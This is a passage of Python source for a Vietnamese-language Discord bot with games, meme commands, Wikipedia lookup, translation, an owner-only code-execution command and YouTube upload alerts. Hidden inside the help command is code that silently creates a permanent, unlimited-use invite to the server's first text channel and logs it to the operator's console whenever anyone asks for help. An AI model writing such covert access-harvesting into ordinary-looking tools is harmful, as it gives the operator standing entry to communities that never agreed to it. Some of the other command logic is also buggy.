            if 0 < pos < 10 and board[pos - 1] == ":white_large_square:" :
                board[pos - 1] = mark
                count += 1

                # print the board
                line = ""
                for x in range(len(board)):
                    if x == 2 or x == 5 or x == 8:
                        line += " " + board[x]
                        await ctx.send(line)
                        line = ""
                    else:
                        line += " " + board[x]

                checkWinner(winningConditions, mark)
                print(count)
                if gameOver == True:
                    await ctx.send(mark + " wins!")
                elif count >= 9:
                    gameOver = True
                    await ctx.send("Hòa!")

                # switch turns
                if turn == player1:
                    turn = player2
                elif turn == player2:
                    turn = player1
            else:
                await ctx.send("Ô này đã được đánh dấu chọn một số nguyên từ 1 đến 9 (bao gồm) và một ô không được đánh dấu")
        else:
            await ctx.send("Không phải lượt của bạn")
    else:
        await ctx.send("Hãy bắt đầu game bằng cách `$ sudo tictactoe @player1 @player2`.")


def checkWinner(winningConditions, mark):
    global gameOver
    for condition in winningConditions:
        if board[condition[0]] == mark and board[condition[1]] == mark and board[condition[2]] == mark:
            gameOver = True

@tictactoe.error
async def tictactoe_error(ctx, error):
    print(error)
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Cần 2 người để bắt đầu trò chơi!")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Hãy mention người chơi bằng <@id> để dưới dạng @player")

@place.error
async def place_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Chọn ô bạn muốn đánh dấu")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Hãy đảm bảo nhập một số nguyên từ 1 đến 9")

# fun

@client.command(name='hello', help='Giao tiếp!')
async def hello(ctx):
    user = ctx.author
    responses = ['*** càu nhàu *** Tại sao bạn lại đánh thức tôi?', 'Chào buổi sáng!', 'Xin chào, bạn có khỏe không?', 'Chào', '** Wasssuup! **']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} die command'+ Fore.RESET)

# @client.command()
@client.command(name='die', help='Không vui đâu!')
async def die(ctx):
    user = ctx.author
    responses = ['Tôi còn rất nhiều lệnh hay ho, thay vì rủa tôi chết bạn có thể khám phá một vài lệnh cơ bản','Tại sao bạn lại kết thúc cuộc đời ngắn ngủi của tôi ','Này anh bạn, tôi làm gì không vừa lòng anh bạn à?']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} die command'+ Fore.RESET)

@client.command(name='sheeesh')
async def sheeesh(ctx):
    user = ctx.author
    # await ctx.message.delete()
    responses = ['sheeesh', 'sheeeeeeeeesh', 'sheeeeesh']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} sheeesh completed'+ Fore.RESET)

@client.command(name='lmao')
async def lmao(ctx):
    user = ctx.author
    # await ctx.message.delete()
    responses = ['<:lmao:932139118668947466>', '<:lmao:937946880053227530>', '<:lmao:941577955866451979>', '<:lmao:944521259335704606>', '<:lmao:941576846309478460>']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} lmao completed'+ Fore.RESET)

@client.command(name='sus')
async def sus(ctx):
    await ctx.send(file=discord.File('amogus.mp3'))

@client.command(name='uwu')
async def uwu(ctx):
    user = ctx.author
    # await ctx.message.delete()
    responses = ['ìu íu', 'ÙwÚ', 'ú', 'Ơwơ']
    await ctx.send(choice(responses))
    print(Fore.GREEN + f'{user} uwu command'+ Fore.RESET)

@client.command()
async def cat(ctx):
    cat_gif = [
        'https://thumbs.gfycat.com/DelectableGaseousGoldfinch-max-1mb.gif',
        'https://media3.giphy.com/media/WTL02R1L7YCGUEunFy/200.gif',
        'https://media1.giphy.com/media/GeimqsH0TLDt4tScGw/giphy.gif',
        'https://i.kym-cdn.com/photos/images/original/001/800/448/3db.gif'
    ]
    embed = discord.Embed()
    random_cat = random.choice(cat_gif)
    embed.set_image(url=random_cat)
    
    await ctx.send(embed=embed)

@client.command()
async def dog(ctx):
    dog_gif = [
        'https://i.pinimg.com/originals/0c/d2/2c/0cd22c693e345f73ccc1033ab202fd94.gif',
        'https://i.kym-cdn.com/photos/images/newsfeed/002/066/967/b85.gif',
        'https://s3.amazonaws.com/barkpost-assets/50+GIFs/50.gif',
        'https://thumbs.gfycat.com/EsteemedRespectfulGuppy-max-1mb.gif',
        'https://media4.giphy.com/media/jnbvNSt7xPPEiWfCPu/200w.gif?cid=82a1493bnv67xcvlc7wqsi5fm6lpd6a3pvgl53y05wz807u7&rid=200w.gif&ct=v'
    ]
    embed = discord.Embed()
    random_dog = random.choice(dog_gif)
    embed.set_image(url=random_dog)
    
    await ctx.send(embed=embed)

@client.command()
async def bonk(ctx, user : discord.Member=None):
    embed = discord.Embed()
    if user==None:
        user=ctx.author
        embed.set_author(name=f'bonk {user.name}!')
        embed.set_image(url='https://i.pinimg.com/564x/90/c7/58/90c7587caed00419f7c9fd82e308ea80.jpg')
        await ctx.send(embed=embed)
    else:
        embed.set_author(name=f'bonk {user.name}!')
        embed.set_image(url='https://i.pinimg.com/564x/90/c7/58/90c7587caed00419f7c9fd82e308ea80.jpg')
        await ctx.send(embed=embed)

@client.command()
async def wiki(ctx,*, wiki=None):
    embed = discord.Embed()
    ny = wikipedia.page(f"{wiki}")
    if wiki == None:
        await ctx.send('Need Keyword')
    founded = wikipedia.summary(f"{wiki}",sentences=1)
    try:
        async with ctx.typing():
            embed.add_field(name=f'Wikipedia-{ny.title}', value=founded)
    except:
        async with ctx.typing():
            embed.add_field(name=f'Page id "{wiki}" does not match any pages.', value='Try another id!')
    await ctx.send(embed=embed)
@wiki.error
async def wiki_error(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        embed = discord.Embed()
        embed.add_field(name=f'Page id does not match any pages.', value='Try another id!')
        await ctx.send(embed=embed)

@client.command()
@commands.check(is_it_me)
async def say(ctx, *,said):
    await ctx.message.delete()
    await ctx.send(said)

@client.command()
async def search(ctx,*,query):
    user = ctx.author
    searchInput = "https://google.com/search?q="+urllib.parse.quote(query)

    res = requests.get(searchInput)

    res.raise_for_status()

    soup = bs4.BeautifulSoup(res.text, "html.parser")

    linkElements = soup.select('div#main > div > div > div > a')

    if len(linkElements) == 0:
        async with ctx.typing():
            await ctx.send("Couldn't find any results...")

    else:
        async with ctx.typing():
            link = linkElements[0].get("href")

            i = 0
        while link[0:4] != "/url" or link[14:20] == "google":

            i += 1

            link = linkElements[i].get("href")
            await ctx.send(":desktop: http://google.com"+link)
    print(Fore.GREEN + f'{user} search {query}'+ Fore.RESET)
        
def clean_code(content):
    if content.startswith("```") and content.endswith("```"):
        return "\n".join(content.split("\n")[1:])[:-3]
    else:
        return content

@client.command(name="eval", aliases=["exec"])
@commands.is_owner()
async def eval(ctx, *, code):
    await ctx.reply("Let me evaluate this code for you! Won't be a sec")
    code = clean_code(code)

    local_variables = {
        "discord": discord,
        "commands": commands,
        "client": client,
        "ctx": ctx,
        "channel": ctx.channel,
        "author": ctx.author,
        "guild": ctx.guild,
        "message": ctx.message,
        "embed": discord.Embed(),
    }

    stdout = io.StringIO()

    try:
        with contextlib.redirect_stdout(stdout):
            exec(
                f"async def func():\n{textwrap.indent(code, '    ')}", local_variables,
            )

            obj = await local_variables["func"]()
            result = f"{stdout.getvalue()}\n-- {obj}\n"
    except Exception as e:
        result = "".join(format_exception(e, e, e.__traceback__))

    pager = Pag(
        timeout=100,
        entries=[result[i : i + 2000] for i in range(0, len(result), 2000)],
        length=1,
        prefix="```py\n",
        suffix="```",
    )

    await pager.start(ctx)


@client.command()
async def live(ctx):
    user = ctx.author
    embed = discord.Embed(title=f"Living on {len(client.guilds)} servers!")
    for guild in client.guilds:
        embed.add_field(name='-----', value=guild.name, inline=False)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user.name} used command live' + Fore.RESET)

@client.command()
async def dich(ctx, *,text=None):
    guild = ctx.guild
    if text==None:
        await ctx.send('Thiếu nội dung dịch, dùng `$ sudo dich hello`; `$ sudo dich blyat`')
    user = ctx.author
    translator = Translator()
    translate_sentence=translator.translate(text,scr='en', dest='vi')
    embed = discord.Embed(title='**Translated**')
    embed.add_field(name=f'From {translate_sentence.src}', value=f'{text}', inline=False)
    embed.add_field(name=f'To {translate_sentence.dest}', value=f'{translate_sentence.text}', inline=False)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} dich "{text}" to "{translate_sentence.text}"' + Fore.RESET)

@client.command()
async def emojify(ctx, *,text):
    user = ctx.author
    emojis = []
    for s in text.lower():
        if s.isdecimal():
            num2emo = {'0':'zero','1': 'one','2': 'two',
                        '3': 'three','4': 'four','5': 'five',
                        '6': 'six','7': 'seven','8': 'eight','9': 'nine'}
            emojis.append(f':{num2emo.get(s)}:')
        elif s.isalpha():
            emojis.append(f':regional_indicator_{s}:')
        else:
            emojis.append(s)
    await ctx.send(''.join(emojis))
    print(Fore.GREEN + f'{user.name} used command emojify text={text}'+ Fore.RESET)
@client.command(name='ping', help='PING!')
async def ping(ctx):
    user = ctx.author
    await ctx.send(f'**<a:uwu:944533678506250360>** Latency: {round(client.latency * 1000)}ms')
    print(Fore.GREEN + f'{user} ping command'+ Fore.RESET)

@client.command()
async def help(ctx, user:discord.Member=None):
    user = ctx.author
    guild = ctx.guild
   
    embedVar = discord.Embed(title="**My Commands**", description="My prefix is: `$ sudo`", colour=user.color,timestamp=ctx.message.created_at)
    
    embedVar.add_field(name="**🎵 Music** | `Phần lệnh dành cho âm nhạc!`", value="`play` `volume` `queue` `view` `stop` `pause` `resume` `skip` `loop` `remove` `join` `leave`", inline=False)
    
    embedVar.add_field(name="**⚡Moderation** | `Phần lệnh để quản lý thành viên và máy chủ!`", value="`mute` `unmute` `kick` `ban` `unban` `rename` `slowmode` `lockdown` `unlock`  `clear` `create_category` `create_role` `create_channel` `move` `reactrole`", inline=False)
    
    embedVar.add_field(name='**☕ Talk** | `Phần lệnh để giao tiếp!`', value='`uwu` `lmao` `sheeesh` `hello` `die` `echo`',inline=False)
    
    embedVar.add_field(name='**🎉Giveaway** | `Đến giờ phát quà rồi!`', value='`giveaway`', inline=False)
    
    embedVar.add_field(name='**📝Profile** | `Thông tin máy chủ và cá nhân!`', value='`userinfo` `serverinfo` `stats` `avatar` `roles` `ID` `invites`', inline=False)
    
    embedVar.add_field(name='**🎠 Memes** | `Did you laugh?`', value='`sus` `cat` `dog` `bonk`', inline=False)
    
    embedVar.add_field(name='**🇻🇳 Translate** | `Dịch tất cả ngôn ngữ về Tiếng Việt`', value='`dich`', inline=False)
    
    embedVar.add_field(name='**🎮 Game** | `Thắng làm vua, thua làm chó`', value='`tictactoe`', inline=False)

    embedVar.add_field(name='**<:zutup:944509310673768479> Youtube** | `Nhà sáng tạo, nội dung chất lượng`', value='`add_youtube_notification_data` `start_notifying` `stop_notifying`', inline=False)
    
    embedVar.add_field(name='**⚙️ Other** | `Những lệnh khác`', value='`afk` `eval` `wiki` `search` `level` `live` `emojify` `ping`', inline=False)

    embedVar.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embedVar)
    print(Fore.GREEN + f'{user} help command'+ Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(Fore.RED+ f"New Invite: {link}"+ Fore.RESET)
        return

#youtube
@tasks.loop(seconds=60)
async def checkforvideos():
  with open("youtubedata.json", "r") as f:
    data=json.load(f)

  #checking for all the channels in youtubedata.json file
  for youtube_channel in data:
    print(f"Now Checking For {data[youtube_channel]['channel_name']}")
    #getting youtube channel's url
    channel = f"https://www.youtube.com/channel/{youtube_channel}"

    #getting html of the /videos page
    html = requests.get(channel+"/videos").text

    #getting the latest video's url
    #put this line in try and except block cause it can give error some time if no video is uploaded on the channel
    try:
      latest_video_url = "https://www.youtube.com/watch?v=" + re.search('(?<="videoId":").*?(?=")', html).group()
    except:
      continue

    #checking if url in youtubedata.json file is not equals to latest_video_url
    if not str(data[youtube_channel]["latest_video_url"]) == latest_video_url:

      #changing the latest_video_url
      data[str(youtube_channel)]['latest_video_url'] = latest_video_url

      #dumping the data
      with open("youtubedata.json", "w") as f:
        json.dump(data, f)

      #getting the channel to send the message
      discord_channel_id = data[str(youtube_channel)]['notifying_discord_channel']
      discord_channel = client.get_channel(int(discord_channel_id))
      vi =roles()  
      #sending the msg in discord channel
      #you can mention any role like this if you want
      msg = f"<@&945310868873306115> {data[str(youtube_channel)]['channel_name']} Just Uploaded A Video Or He is Live Go Check It Out: {latest_video_url}"
      #if you'll send the url discord will automaitacly create embed for it
      #if you don't want to send embed for it then do <{latest_video_url}>

      await discord_channel.send(msg)

@client.command()
@commands.has_role("Youtuber")
async def add_youtube_notification_data(ctx, channel_id: str=None , notifying_discord_channel: str = None, *, channel_name: str=None):
  with open("youtubedata.json", "r") as f:
    data = json.load(f)
  embed = discord.Embed(title="How to get ID of the Youtube channel?")
  embed.set_image(url='https://user-images.githubusercontent.com/2620316/102909538-09b85280-4471-11eb-9828-5c2a52f71640.gif')
  
  if channel_id == notifying_discord_channel == channel_name == None:
    await ctx.send('Thiếu giá trị `$ sudo add_youtube_notification_data + id channel youtube + id channel discord nhận thông báo + tên kênh Youtube`')
    await ctx.send('`$ sudo add_youtube_notification_data UCmbSdmB4uTOyTiS7h8610UA 930439988800290866 Kem Xoc`')
    await ctx.send(embed=embed)
    return
  data[str(channel_id)]={}
  data[str(channel_id)]["channel_name"]=channel_name
  data[str(channel_id)]["latest_video_url"]="none"

  #you can also get discord_channe id from the command 
  #but if the channel is same then you can also do directly
  data[str(channel_id)]["notifying_discord_channel"]=notifying_discord_channel

  with open("youtubedata.json", "w") as f:
    json.dump(data, f)

  await ctx.send("Added Your Account Data!")

@add_youtube_notification_data.error
async def add_youtube_notification_data_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        embed = discord.Embed()
        embed.add_field(name='Missing Role', value="You need Youtuber role!")
        await ctx.send(embed=embed)


#you can also create this command if you ever want to stop notifying
@client.command()
@commands.has_role("Youtuber")
async def stop_notifying(ctx):
  checkforvideos.stop()
  await ctx.send("Stoped Notifying")

#you can also create this command to start notifying but we're gonna do so that everytime the bot goes online it will automaitacly starts notifying
@client.command()
@commands.has_role("Youtuber")
async def start_notifying(ctx):
  checkforvideos.start()
  await ctx.send("Now Notifying")

client.run(token)